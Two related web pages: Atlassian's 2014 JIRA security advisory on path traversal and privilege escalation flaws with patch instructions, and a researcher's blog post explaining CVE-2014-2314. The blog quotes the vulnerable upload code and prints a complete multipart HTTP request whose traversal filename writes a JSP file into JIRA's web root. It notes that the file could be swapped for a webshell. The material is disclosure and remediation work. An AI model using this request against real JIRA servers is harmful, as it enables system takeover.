=== Content from confluence.atlassian.com_f636aa59_20250125_012139.html ===

![](/staticassets/4.7.4/dist/common/images/media-viewer-image-icon.svg)
##

![]()

[![](/staticassets/4.7.4/dist/common/images/header-atlassian-logo.svg)](https://support.atlassian.com/)

* Products
* Resources

* [Search](https://support.atlassian.com/search-results/)
* [Log in](https://id.atlassian.com/login?continue=https://confluence.atlassian.com/login.action?os_destination=/jira/jira-security-advisory-2014-02-26-445188412.html)
* ![]()
  + [View account](https://my.atlassian.com/)
  + [View requests](https://support.atlassian.com/servicedesk/customer/user/requests)
  + [Log out](/logout.action?os_destination=https://id.atlassian.com/logout?continue=/jira/jira-security-advisory-2014-02-26-445188412.html)
* ...

## Products

* [### Jira Software

  Project and issue tracking](https://support.atlassian.com/jira-software-cloud)
* [### Jira Service Management

  Service management and customer support](https://support.atlassian.com/jira-service-management-cloud)
* [### Jira Work Management

  Manage any business project](https://support.atlassian.com/jira-work-management)
* [### Confluence

  Document collaboration](https://support.atlassian.com/confluence-cloud)
* [### Bitbucket

  Git code management](https://support.atlassian.com/bitbucket-cloud)

[See all](https://support.atlassian.com/products/)

## Resources

* [### Documentation

  Usage and admin help](https://confluence.atlassian.com)
* [### Community

  Answers, support, and inspiration](https://community.atlassian.com)
* [### System Status

  Cloud services health](http://status.atlassian.com)
* [### Suggestions and bugs

  Feature suggestions and bug reports](https://jira.atlassian.com)
* [### Marketplace

  Product apps](https://marketplace.atlassian.com)
* [### Billing and licensing

  Frequently asked questions](https://www.atlassian.com/licensing/purchase-licensing)

* [Log out](/logout.action?os_destination=https://id.atlassian.com/logout?continue=/jira/jira-security-advisory-2014-02-26-445188412.html)
* [Log in to account](https://id.atlassian.com/login?continue=https://confluence.atlassian.com/login.action?os_destination=/jira/jira-security-advisory-2014-02-26-445188412.html)
* [Contact support](https://support.atlassian.com/contact/)
* [Training & Certification](https://www.atlassian.com/university)
* [Cloud Migration Center](https://www.atlassian.com/cloud-migration)
* [GDPR guides](https://confluence.atlassian.com/gdpr)
* [Enterprise services](https://www.atlassian.com/enterprise/services)
* [Atlassian partners](https://www.atlassian.com/partners)
* [Developers](https://developer.atlassian.com/)
* [User groups](http://aug.atlassian.com/)
* [Automation for Jira](https://confluence.atlassian.com/automation/)
* [Atlassian.com](http://www.atlassian.com/)

* #### Page
* [View in Confluence](/login.action?os_destination=%2Fpages%2Fviewpage.action%3FpageId%3D445188412)
* [Edit Page](/login.action?os_destination=https%3A%2F%2Fconfluence.atlassian.com%2Fpages%2Feditpage.action%3FpageId%3D445188412%26atl_token%3Dfada27525499450fbca48617e1e5d8c52033e6da)
* #### Viewport
* [Manage Viewport](/login.action?os_destination=%2Fspaces%2Fscroll-viewport%2Fconfig.action%3Fkey%3DJIRA)
* #### Confluence
* [Dashboard](/login.action?os_destination=%2Fdashboard.action)
* [Space Directory](/login.action?os_destination=%2Fspacedirectory%2Fview.action)
* [People Directory](/login.action?os_destination=%2Fpeopledirectory.action)

[JIRA 6.4.x](/display/JIRA/Jira%2BDocumentation)

Documentation

Unable to load

* [Atlassian Support](https://support.atlassian.com/ "Atlassian Support")
* [Documentation](/ "Documentation")
* [JIRA 6.4.x](/display/JIRA/Jira%2BDocumentation "JIRA 6.4.x")
* [JIRA Releases](/jira/jira-releases-133316.html "JIRA Releases")
* [Security Advisories](/jira/security-advisories-112853939.html "Security Advisories")
* [JIRA Security Advisory 2014-02-26](/jira/jira-security-advisory-2014-02-26-445188412.html "JIRA Security Advisory 2014-02-26")

# JIRA Security Advisory 2014-02-26

#### Security Advisories

* [JIRA Security Advisory 2007-12-24](/jira/jira-security-advisory-2007-12-24-116949034.html)
* [JIRA Security Advisory 2008-02-21](/jira/jira-security-advisory-2008-02-21-129171459.html)
* [JIRA Security Advisory 2008-08-26](/jira/jira-security-advisory-2008-08-26-166004521.html)
* [JIRA Security Advisory 2008-10-29](/jira/jira-security-advisory-2008-10-29-169117571.html)
* [JIRA Security Advisory 2008-12-09](/jira/jira-security-advisory-2008-12-09-170495046.html)
* [JIRA Security Advisory 2009-04-02](/jira/jira-security-advisory-2009-04-02-177340733.html)
* [JIRA Security Advisory 2010-04-16](/jira/jira-security-advisory-2010-04-16-216433270.html)
* [JIRA Security Advisory 2010-06-18](/jira/jira-security-advisory-2010-06-18-218267805.html)
* [JIRA Security Advisory 2010-12-06](/jira/jira-security-advisory-2010-12-06-227414698.html)
* [JIRA Security Advisory 2011-02-21](/jira/jira-security-advisory-2011-02-21-232555106.html)
* [JIRA Security Advisory 2011-09-27](/jira/jira-security-advisory-2011-09-27-263422027.html)
* [JIRA Security Advisory 2012-05-17](/jira/jira-security-advisory-2012-05-17-283641192.html)
* [JIRA Security Advisory 2012-08-28](/jira/jira-security-advisory-2012-08-28-297667738.html)
* [JIRA Security Advisory 2013-02-21](/jira/jira-security-advisory-2013-02-21-321859644.html)
* [JIRA Security Advisory 2014-02-26](/jira/jira-security-advisory-2014-02-26-445188412.html)
* [JIRA and HipChat for JIRA plugin Security Advisory 2015-08-26](/jira/jira-and-hipchat-for-jira-plugin-security-advisory-2015-08-26-776650785.html)
* [JIRA Security Advisory 2015-12-09](/jira/jira-security-advisory-2015-12-09-792307790.html)
* [JIRA and HipChat for JIRA plugin Security Advisory 2016-09-21](/jira/jira-and-hipchat-for-jira-plugin-security-advisory-2016-09-21-849052099.html)
* [JIRA Security Advisory 2017-03-09](/jira/jira-security-advisory-2017-03-09-879243455.html)
* [JIRA Security Advisory 2019-07-10](/jira/jira-security-advisory-2019-07-10-973486595.html)
* [Jira Service Desk Security Advisory 2019-09-18](/jira/jira-service-desk-security-advisory-2019-09-18-976171274.html)
* [Jira Security Advisory 2019-09-18](/jira/jira-security-advisory-2019-09-18-976766250.html)
* [Jira Service Desk Security Advisory 2019-11-06](/jira/jira-service-desk-security-advisory-2019-11-06-979412717.html)
* [Jira Server for Slack Security Advisory 17th February 2021](/jira/jira-server-for-slack-security-advisory-17th-february-2021-1044091690.html)
* [Jira Security Advisory 2022-04-20](/jira/jira-security-advisory-2022-04-20-1115127899.html)
* [Jira Server Security Advisory 29nd June 2022](/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html)
* [Jira Service Management Server and Data Center Advisory (CVE-2023-22501)](/jira/jira-service-management-server-and-data-center-advisory-cve-2023-22501-1188786458.html)

#### On this page

#### Related content

* No related content found

#### Still need help?

The Atlassian Community is here for you.

[Ask the community](https://community.atlassian.com/t5/custom/page/page-id/create-post-step-1?add-tags=Atlassian+Support)

This advisory details critical security vulnerabilities that we have found in JIRA and fixed in recent versions of JIRA.

* **Customers****who have downloaded and installed JIRA**should upgrade their existing JIRA installations **or** apply the patches to fix these vulnerabilities.
* **Atlassian OnDemand customers** have been upgraded with the fixes for the issues described in this advisory.

These vulnerabilities affect all versions of JIRA up to and including 6.1.3.

Atlassian is committed to improving product security. We [fully support the reporting of vulnerabilities](https://www.atlassian.com/security/How-to-report-security-issue) and we appreciate it when people work with us to identify and solve the problem.

If you have questions or concerns regarding this advisory, please raise a support request at [http://support.atlassian.com](http://support.atlassian.com/).

## **Issue 1:** Path traversal in JIRA Issue Collector plugin (Windows only)

### Severity

Atlassian rates the severity level of this vulnerability as **critical**, according to the scale published in [Severity Levels for Security Issues](https://www.atlassian.com/security/security-severity-levels). The scale allows us to rank the severity as critical, high, moderate or low.

This is an independent assessment and you should evaluate its applicability to your own IT environment.

### Description

We have identified and fixed a vulnerability in JIRA which allowed unauthenticated users to create files in any valid directory inside a JIRA install. In order to exploit this vulnerability, an attacker requires access to your JIRA web interface.

This issue only affects JIRA servers running on Windows OS. It is not exploitable on Linux and OSX systems.

The vulnerability affects all supported versions of JIRA up to and including 6.0.3. It has been fixed in 6.0.4. The issue is tracked in
[JRA-36442](https://jira.atlassian.com/browse/JRA-36442)
-
Getting issue details...
STATUS
.

Our thanks to Philippe Arteau of Groupe Technologies Desjardins who reported this vulnerability.

### Risk Mitigation

If you are unable to upgrade or patch your JIRA server, you can [disable the JIRA Issue collector plugin](/jira/managing-add-ons-185729595.html#ManagingAdd-ons-disable) via the JIRA administration interface.

In case you require the plugin, do the following as a **temporary workaround**:

* Block access to your JIRA server web interface from untrusted networks, such as the Internet.

### Fix

This vulnerability can be fixed by upgrading JIRA. Alternatively, you can upgrade only the vulnerable plugin.

The [Security Patch Policy](https://www.atlassian.com/security/security-patch-policy) describes when and how we release security patches and security upgrades for our products.

#### Upgrading JIRA

Upgrade to JIRA 6.0.4 or a later version, which fixes this vulnerability. For a full description of these releases, see the [JIRA Release Notes](/jira/jira-releases-133316.html). You can download these versions of JIRA from the [download centre](https://www.atlassian.com/software/jira/download).

If you cannot upgrade JIRA at the moment, you can upgrade only the Issue Collector plugin. See [Managing JIRA's Plugins](/jira/managing-add-ons-185729595.html) for instructions on how to upgrade a plugin. In general, you should upgrade this plugins to the latest available version compatible with your version of JIRA.

## **Issue 2:** Path traversal in JIRA Importers plugin (Windows only)

### Severity

Atlassian rates the severity level of this vulnerability as **critical**, according to the scale published in [Severity Levels for Security Issues](https://www.atlassian.com/security/security-severity-levels). The scale allows us to rank the severity as critical, high, moderate or low.

This is an independent assessment and you should evaluate its applicability to your own IT environment.

### Description

We have identified and fixed a vulnerability in JIRA which allowed unauthenticated users to create files in any valid directory inside a JIRA install. In order to exploit this vulnerability, an attacker requires access to your JIRA web interface.

This issue only affects JIRA servers running on Windows OS. It is not exploitable on Linux and OSX systems.

The vulnerability affects all supported versions of JIRA up to and including 6.0.4. It has been fixed in 6.0.5. The issue is tracked in
[JRA-36441](https://jira.atlassian.com/browse/JRA-36441)
-
Getting issue details...
STATUS
.

### Risk Mitigation

If you are unable to upgrade or patch your JIRA server you can [disable the JIRA Importers plugin](/jira/managing-add-ons-185729595.html#ManagingAdd-ons-disable) via the JIRA administration interface.

In case you require the plugin, do the following as a **temporary workaround**:

* Block access to your JIRA server web interface from untrusted networks, such as the Internet.

### Fix

This vulnerability can be fixed by upgrading JIRA. Alternatively, you can upgrade only the vulnerable plugin.

The [Security Patch Policy](https://www.atlassian.com/security/security-patch-policy) describes when and how we release security patches and security upgrades for our products.

#### Upgrading JIRA

Upgrade to JIRA 6.0.4 or a later version, which fixes this vulnerability. For a full description of these releases, see the [JIRA Release Notes](/bamboo/bamboo-release-notes-671089224.html). You can download these versions of JIRA from the [download centre](https://www.atlassian.com/software/jira/download).

If you cannot upgrade JIRA at the moment, you can upgrade only the JIRA Importers plugin. See [Managing JIRA's Plugins](/jira/managing-add-ons-185729595.html) for instructions on how to upgrade a plugin. In general, you should upgrade this plugins to the latest available version compatible with your version of JIRA.

## **Issue 3:** Privilege escalation

### Severity

Atlassian rates the severity level of this vulnerability as **critical**, according to the scale published in [Severity Levels for Security Issues](https://www.atlassian.com/security/security-severity-levels). The scale allows us to rank the severity as critical, high, moderate or low.

This is an independent assessment and you should evaluate its applicability to your own IT environment.

### Description

We have identified and fixed a vulnerability in JIRA which allowed unauthenticated attackers to commit actions on behalf of any other authorised user. In order to exploit this vulnerability, an attacker requires access to your JIRA web interface.

The vulnerability affects all supported versions of JIRA up to and including 6.1.3. It has been fixed in 6.1.4. The issue is tracked in
[JRA-35797](https://jira.atlassian.com/browse/JRA-35797)
-
Getting issue details...
STATUS
.

### Risk Mitigation

If you are unable to upgrade or patch your JIRA server you can do the following as a **temporary workaround**:

* Block access to your JIRA server web interface from untrusted networks, such as the Internet.
* Turn on [Secure Administrator Sessions](/jira/configuring-secure-administrator-sessions-231343939.html), this prevents privilege escalation to administrative accounts. Non-privileged accounts will still be vulnerable.

### Fix

This vulnerability can be fixed by upgrading JIRA. There is also a patch available for this vulnerability for the following supported versions of JIRA. If you have any questions, please raise a support request at [http://support.atlassian.com](http://support.atlassian.com/). We recommend upgrading.

The [Security Patch Policy](https://www.atlassian.com/security/security-patch-policy) describes when and how we release security patches and security upgrades for our products.

#### Upgrading JIRA

Upgrade to JIRA 6.1.4 or a later version, which fixes this vulnerability. For a full description of these releases, see the [JIRA Release Notes](/jira/jira-releases-133316.html). You can download these versions of JIRA from the [download centre](https://www.atlassian.com/software/jira/download).

#### **Patches**

We recommend patching **only** when you cannot upgrade or cannot apply external security controls. Patches are usually only provided for vulnerabilities of critical severity (as per our [Security Patch Policy](https://www.atlassian.com/security/security-patch-policy) ) as an interim solution until you can upgrade. You should not continually patch your system instead of upgrading. Our patches are often non-cumulative – we do not recommend that you apply multiple patches from different advisories on top of each other, and we strongly recommend upgrading to the most recent version regularly.

If for some reason you cannot upgrade to the latest version of JIRA, you must upgrade to the last minor version of the release. For example, if you have JIRA 5.1.1, you will have to upgrade 5.1.8 and then apply the patch provided below to fix the vulnerability described in this advisory.

Download the patch package:

Patches are provided for the last minor version of each major release. If you don't have the exact JIRA version installed, you will need to upgrade to the last minor version of the release in order to apply the patch (this means if you have JIRA 5.1.1, you will have to upgrade to 5.1.8 in order to be able to apply the patch).

| Version | Patch Package | md5 |
| --- | --- | --- |
| JIRA 4.4.5 | [patch-JRA-35797-4.4.5-20140303.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-4.4.5-20140303.zip) | 47990989c958b4b7c51785075b84e12f |
| JIRA 5.0.7 | [patch-JRA-35797-5.0.7-20140303.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-5.0.7-20140303.zip) | 1f940b97ba8bc127f306eecdad44bc55 |
| JIRA 5.1.8 | [patch-JRA-35797-5.1.8.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-5.1.8.zip) | d7db72b3656dc952604a7f7a6fea380b |
| JIRA 5.2.11 | [patch-JRA-35797-5.2.11-20140303.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-5.2.11-20140303.zip) | 3a7fe0b8a35b295ffdf93102955f7d86 |
| JIRA 6.0.8 | [patch-JRA-35797-6.0.8.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-6.0.8.zip) | 1550f9e7784aad41f69c07efe634966f |
| JIRA 6.1.x | There's no patch, upgrade directly to 6.1.4 or above | n/a |

WINDOWS USERS : Do not use the built in Windows ZIP extractor to apply this patch!

By default it replaces all the files in a directory instead of merging the files in. If this happens, JIRA will not be able to work correctly. Use another zip tool such as WinZip or 7-Zip. Alternatively, extract the files into a different directory and copy them to `<jira_install>/atlassian-jira/WEB-INF/lib` manually.

Instructions for specific versions of JIRA are available in a file `JRA-35797-x.x.x-patch-instructions.txt` located inside the corresponding ZIP file.

For reference,**instructions for JIRA 6.0.8** are below (please be sure to follow the instructions in the patch zip you have downloaded as each version has slightly different instructions):

Before applying the patch file, make a copy of your JIRA web application directory in case things go wrong. This will allow you to more easily back out any changes.

If you are using the Standalone distribution of JIRA:

1. Download the file patch-JRA-35797/patches/JRA-35797-6.0.8-patch.zip
2. In the <jira\_install>/atlassian-jira/WEB-INF/lib directory delete the following files:
   * atlassian-gadgets-api-3.2.0-m26.jar
   * atlassian-gadgets-spi-3.2.0-m26.jar
   * atlassian-trusted-apps-core-2.5.2.jar
   * atlassian-trusted-apps-seraph-integration-2.5.2.jar
   * sal-api-2.10.2.jar
   * sal-spi-2.10.2.jar
3. Expand the zip file into <jira\_install\_dir>/atlassian-jira/ overwriting the files there
4. Restart JIRA

If you are using the WAR distribution of JIRA:

1. Download the file patch-JRA-35797/patches/JRA-35797-6.0.8-patch.zip
2. In the <jira\_install\_jir>/webapp/WEB-INF/lib directory delete the following files:
   * atlassian-gadgets-api-3.2.0-m26.jar
   * atlassian-gadgets-spi-3.2.0-m26.jar
   * atlassian-trusted-apps-core-2.5.2.jar
   * atlassian-trusted-apps-seraph-integration-2.5.2.jar
   * sal-api-2.10.2.jar
   * sal-spi-2.10.2.jar
3. Expand the zip file to <jira\_install\_dir>/webapp overwriting the files there
4. Run 'build.sh clean' on unix or 'build.bat clean' on windows
5. Run 'build.sh' on unix or 'build.bat' on windows
6. Redeploy the JIRA web app into your application server

Last modified on Aug 11, 2014

Was this helpful?

Yes
No
 It wasn't accurate

 It wasn't clear

 It wasn't relevant

Provide feedback about this article

#### Related content

* No related content found

Powered by [Confluence](http://www.atlassian.com/) and [Scroll Viewport](https://www.k15t.com/go/scroll-viewport).

[Atlassian](https://www.atlassian.com/)

* [Notice at Collection](https://www.atlassian.com/legal/privacy-policy#additional-disclosures-for-ca-residents)
* [Privacy Policy](https://www.atlassian.com/legal/privacy-policy)
* [Terms of Use](https://www.atlassian.com/legal/customer-agreement)
* [Security](https://www.atlassian.com/trust/security)
* ©  Atlassian



=== Content from blog.h3xstream.com_93d9179b_20250125_012137.html ===


# [h3xStream's blog](http://blog.h3xstream.com/) \_

## Pages

* [Blog](http://blog.h3xstream.com/)
* [Tools](http://blog.h3xstream.com/p/tools.html)
* [Conferences](http://blog.h3xstream.com/p/conferences.html)

## Wednesday, February 26, 2014

### Jira Path Traversal explained (CVE-2014-2314)

[A new advisory has been published](https://confluence.atlassian.com/display/JIRA/JIRA%2BSecurity%2BAdvisory%2B2014-02-26) about a [path traversal](http://projects.webappsec.org/w/page/13246952/Path%20Traversal) vulnerability affecting Jira 5.0.11 and 6.0.3. The vulnerability was corrected in July of last year and the fixes were deployed in the following months.

The attack is quite simple but, the potential impact is considerable. It could allow a attacker to upload a file that would serve as a webshell. I will explain how it was found by static analysis and why a little detail made it exploitable only on Windows operating system.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtnRxqaC64QDZ6NIJBgmAyXVgghPyIitWaGVqVj6SlG4NCUu_4aToksujYBd1Jl60f73t9XBmozf9lRJwIEPSFFFkn8A86XjjuFPewfsYcLf8i7YAMZxMFawLXumCNqbxQcIQFJBD8KqdX/s1600/logo_jira.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtnRxqaC64QDZ6NIJBgmAyXVgghPyIitWaGVqVj6SlG4NCUu_4aToksujYBd1Jl60f73t9XBmozf9lRJwIEPSFFFkn8A86XjjuFPewfsYcLf8i7YAMZxMFawLXumCNqbxQcIQFJBD8KqdX/s1600/logo_jira.png)

## Identifying the vulnerability

The following code sample is taken from the plugin [Issues Collector](https://marketplace.atlassian.com/plugins/com.atlassian.jira.collector.plugin.jira-issue-collector-plugin). The plugin support file upload to attach screenshots to a ticket. It use Jira REST api.

**com/atlassian/jira/collector/plugin/rest/TemporaryAttachmentsResource.java**

```
[...]
  @POST
  @Path("multipart/{collectorId}")
  @Consumes({"multipart/form-data"})
  @Produces({"text/html"})
  public Response attachTemporaryFileViaForm(@PathParam("collectorId") String collectorId, @MultipartFormParam("screenshot") Collection<filepart> fileParts) { ServiceOutcome outcome = this.collectorService.getCollector(collectorId);
   [...]
    FilePart filePart = (FilePart)fileParts.iterator().next();
    try
    {
     [...]

      TemporaryAttachment temporaryAttachment = createTemporaryAttachment(filePart.getName(), filePart.getContentType(), filePart.getInputStream());
      temporaryAttachmentsMonitor.add(temporaryAttachment);
      context.put("temporaryAttachment", temporaryAttachment);
      return Response.ok(renderTemplate("templates/rest/tempfilejson.vm", context)).cacheControl(com.atlassian.jira.rest.v1.util.CacheControl.NO_CACHE).build();
    }
    catch (IOException e) {
    }
    return Response.serverError().cacheControl(com.atlassian.jira.rest.v1.util.CacheControl.NO_CACHE).build();
  }

  private TemporaryAttachment createTemporaryAttachment(String fileName, String contentType, InputStream inputStream)
  {
    File tmpDir = AttachmentUtils.getTemporaryAttachmentDirectory();
    long uniqueId;
    File tempAttachmentFile;
    do
    {
      uniqueId = getUUID();
      tempAttachmentFile = new File(tmpDir, uniqueId + "_" + fileName);
    }
    while (tempAttachmentFile.exists());

    FileOutputStream output = null;
    try
    {
      output = new FileOutputStream(tempAttachmentFile);
      IOUtils.copy(inputStream, output);
      output.close();
    }
    catch (IOException e)
    {
      IOUtils.closeQuietly(output);
      log.error("Error creating temporary attachment", e);
      return null;
    }

    return new TemporaryAttachment(Long.valueOf(uniqueId), Long.valueOf(-1L), tempAttachmentFile, fileName, contentType);
  }

```

At the line 31, we have the file handle used to move the uploaded file to a temporary directory for attachments. The *fileName* value is not filter at any moment. This value come from the multipart request therefore can be control by the client.

**sink**
```
tempAttachmentFile = new File(tmpDir, uniqueId + "_" + fileName);

```

**source**
```
[...]createTemporaryAttachment(filePart.getName(), filePart.getContentType(), filePart.getInputStream());

```
## Exploitation

To upload a file outside of the attachments folder, a classic path traversal pattern can be use to traverse to the root of the public web directory (*/atlassian-jira/*). As seen in the previous code sample, no validation is done to the file content. A JSP shell could be uploaded to gain system access.

```
POST /rest/collectors/1.0/tempattachment/multipart/2c1ce5fa  HTTP/1.1
Host: hackme.atlassian.net
Cookie: atlassian.xsrf.token=BQ79-A85Q-7DOM-UMFN|e98231aaaef98a0d9dc7c52e87f4e84cf9cd3085
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------16266315542468
Content-Length: 345

-----------------------------16266315542468
Content-Disposition: form-data; name="screenshot"; filename="/../../../atlassian-jira/hello.jsp"
Content-Type: text/plain
# Hello world!

-----------------------------16266315542468

```

The filename provided in the request **"/../../../atlassian-jira/hello.jsp"** will be concatenated to the uniqueid and preceded by the temporary directory path.

**On Windows:**
```
C:\Program Files\Atlassian\Application Data\JIRA\caches\tmp_attachments\6177763437089900999_/../../../atlassian-jira/hello.jsp
```

**On Linux:**
```
/opt/atlassian/jira/caches/tmp_attachments/6177763437089900999_/../../../atlassian-jira/hello.jsp
```

On windows the path will be minimize to **"C:\Program Files\Atlassian\Application Data\JIRA\atlassian-jira\hello.jsp"** and the file will be written. On the other hand, Linux systems will evaluate the complete chain and identify that the folder **"/opt/atlassian/jira/caches/tmp\_attachments/6177763437089900999\_"** doesn't exist. Therefore, the attack would not be possible.

At this point, you can replace the file uploaded by a webshell that would be publicly available.

## Remediation

If you maintain a Jira instance, you should have received the update already. If it is not the case, refer to the original advisory.

## References

[JIRA Security Advisory 2014-02-26](https://confluence.atlassian.com/display/JIRA/JIRA%2BSecurity%2BAdvisory%2B2014-02-26) : The official advisory

[WASC: Path traversal](http://projects.webappsec.org/w/page/13246952/Path%20Traversal) : Complete description of the Path traversal vulnerability

Posted by

[Philippe Arteau](https://www.blogger.com/profile/12830184811509526452 "author profile")

at

[10:17 AM](http://blog.h3xstream.com/2014/02/jira-path-traversal-explained.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=5696563284753666742&postID=7225339442028460052&from=pencil "Edit Post")

|  |  | [Tweet](https://twitter.com/share) |
| --- | --- | --- |

Labels:
[cve](http://blog.h3xstream.com/search/label/cve),
[jira](http://blog.h3xstream.com/search/label/jira),
[path traversal](http://blog.h3xstream.com/search/label/path%20traversal),
[upload](http://blog.h3xstream.com/search/label/upload),
[vulnerability](http://blog.h3xstream.com/search/label/vulnerability)

#### No comments:

#### Post a Comment

[Newer Post](http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html "Newer Post")

[Older Post](http://blog.h3xstream.com/2014/02/hql-for-pentesters.html "Older Post")

[Home](http://blog.h3xstream.com/)

Subscribe to:
[Post Comments (Atom)](http://blog.h3xstream.com/feeds/7225339442028460052/comments/default)

## Author

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgHM2ABi-ALQHP7AEQQWVmhTTXoLINDTb555tAP7h5e8YuXYpXJJSc3nCdTekSsXcaLJE3QL0_Op_-OCw6l_Rhk4Vr2XYSLURZW-7UfBdPpo0d1WgCk1bq8rTZkHwFbYxdJq8YthrKVcz_Q20RkVK6iaRzBFk3rNCHIlfQu5M9Aetjjw0S9n-0eIwmaww)](https://twitter.com/h3xstream/)

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjUwNuOfR7dzAnOlsGHFiRqcSkFaGokgtv2liYDKmCwml4LI5w9PM5OUP1j1P8KRug2ZSUWR49RIhzfLOy2onP9YMKQ7Tl33iI0jmhsxGYr6Xm5Eu5G9ziYbTumRS593IlcabNouCgGyAMdNhGlMUalCQk3SWHaCBe8-esWnWHecowF_HM3yWHhXpwD6w)](https://github.com/h3xstream)
[![](https://blogger.googleusercontent.com/img/a/AVvXsEgWocJzxnA4IlijuK5UjiqDLdYih5iHotlEVdcS9u20VYLS8k6fGruTDDBBrn4ZuBKokVeVQFjUhF2WfrzRN3Zx3bRIolqEgw_EH0BGmTeMs_qP2KYemGU6h60Cu1jPch73FnW-kvqF2WmXmtbC_AOfKTEwopxMdtP4AVCJIYxejAnvduntYdXvDNAxVw)](https://www.linkedin.com/in/philippearteau "Philippe Arteau")
[![](https://blogger.googleusercontent.com/img/a/AVvXsEi8qpqb1ieJa_OLWDlya5_nRFg7kY1TSwdvlA_25ZgQJJ_wYXyvxA-kULyTQbhDbpVOe1EqH-I_594b_pq_5I7w5sTdb0Qy4ylTq96WlRLAhuRDDYXu5NH-STG2QLjxF_24f7NZ086c_AjekWUbV87ZzVhMGECcqrWQ_GSwLpRkNfbxsj4std9mvgJN3g)](https://dev.to/h3xstream "Philippe Arteau")

[Follow @h3xstream](https://twitter.com/h3xstream)

[Google+](https://plus.google.com/%2BPhilippeArteau?rel=author)
[Google+ referal](https://plus.google.com/113482780352013381065?rel=author)

## Popular Posts

* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBO4waKV8VXEFVCqsfNTokGG2Z9azmgN3G-V6T4LrNX0R-lPm7mPP8kboncfhtPiVDXDK-D3sc71mwwM_wDSDkO5dBehBdoKBb6OhWTra6exCwM43MXDxDtmGEU9ZAXdVodHyP41hYvGLr/w72-h72-p-k-no-nu/hacking_activity.png)](http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html)

  [Identifying Xml eXternal Entity vulnerability (XXE)](http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html)
  Here is a small writeup on how a XXE was discover on the website RunKeeper.com . The website, as the name suggest, keep track of your traini...
* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhlG7AUpRjwcgfmzfJiNvNmhQawYc4J5McYgUJ0v9COuaTJGyRa0DCvlsb43m-dAiN9DhtuslofHoffKgOo3K5JOhfAXXL-lijNuibRdukRbaK4u1GAyTs7vTdg0CjQeTcDXmddNSY48Ac/w72-h72-p-k-no-nu/hibernate-logo%255B1%255D.png)](http://blog.h3xstream.com/2014/02/hql-for-pentesters.html)

  [HQL for pentesters](http://blog.h3xstream.com/2014/02/hql-for-pentesters.html)
  SQL injection is a highly coveted type of attack. Plenty of resources exist to take advantage of an injection on common DBMS (MySQL, Oracle,...
* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPVnidYg-zDcbocWT8PLVe-A3XzqWbXSUIOdIu3iFJMr5MSMm9yFg3hsyGDbuWrpqbgrpUj9XY2JyIdgNJv50IlUdIgeIHjNmBjqVYz8Vz8YO-e3toUt6Bd_Dwf9etJAumCHr8Mq89KQGT/w72-h72-p-k-no-nu/s1bwt2caxl3q8m5d3rdc%255B1%255D.jpg)](http://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html)

  [Bypassing ModSecurity WAF](http://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html)
   Being able to bypass Web Application Firewall (WAF) depends on your knowledge about their behavior. Here is a cool technique th...
* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjg7aLzYD2_lxNFbzk2uImf0Id_uOXb45d-z_mkCoZD3wcD3vMy52PtEow16K6BcXZshnhi_5fpJBmwQRxAc-suHOiIMf6ZsxtwpsjNdi0qCv93lGUoszq1uxTUFjr_SpvPcpxgfrGFRSJZ/w72-h72-p-k-no-nu/linkedin_card_v2%255B1%255D.png)](http://blog.h3xstream.com/2021/04/deanonymizing-linkedin-users.html)

  [Deanonymizing LinkedIn Users](http://blog.h3xstream.com/2021/04/deanonymizing-linkedin-users.html)
   In this blog post, we will look at the privacy issues with some of LinkedIn’s external APIs. We will demonstrate how it is p...
* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhC6lyO_6w4U5-ILVq2rojkrFYCrRnHLprlfQdJleyWe82weTe-2UldY6Q9IVQlvCccv0E2ALNF4ZQ47fxxtY1CZ_WU_v-a4mLR--hx_RHvzJ9mfVgKRE_Jvmc5xqgDUa4dq2fAjZKnVnb5X1Yq0Pm3wR5trYjJ2JgF2mzgFQoBB8HbeVbj8v8j0WDncA/w72-h72-p-k-no-nu/personal_firewall%5B1%5D.png)](http://blog.h3xstream.com/2022/12/hackfest-2022-web-application-firewall.html)

  [Hackfest 2022: Web Application Firewall (Bypasses) Workshop](http://blog.h3xstream.com/2022/12/hackfest-2022-web-application-firewall.html)
  Last month, I presented a workshop on Web Application Firewall (WAF) bypasses at Québec's Hackfest security conference . The workshop ga...

## Archives

* ►
  [2022](http://blog.h3xstream.com/2022/)
  (2)
  + ►
    [December](http://blog.h3xstream.com/2022/12/)
    (1)
  + ►
    [March](http://blog.h3xstream.com/2022/03/)
    (1)

* ►
  [2021](http://blog.h3xstream.com/2021/)
  (6)
  + ►
    [December](http://blog.h3xstream.com/2021/12/)
    (1)
  + ►
    [October](http://blog.h3xstream.com/2021/10/)
    (1)
  + ►
    [April](http://blog.h3xstream.com/2021/04/)
    (2)
  + ►
    [March](http://blog.h3xstream.com/2021/03/)
    (2)

* ►
  [2020](http://blog.h3xstream.com/2020/)
  (2)
  + ►
    [October](http://blog.h3xstream.com/2020/10/)
    (1)
  + ►
    [August](http://blog.h3xstream.com/2020/08/)
    (1)

* ►
  [2019](http://blog.h3xstream.com/2019/)
  (3)
  + ►
    [October](http://blog.h3xstream.com/2019/10/)
    (1)
  + ►
    [July](http://blog.h3xstream.com/2019/07/)
    (1)
  + ►
    [May](http://blog.h3xstream.com/2019/05/)
    (1)

* ►
  [2018](http://blog.h3xstream.com/2018/)
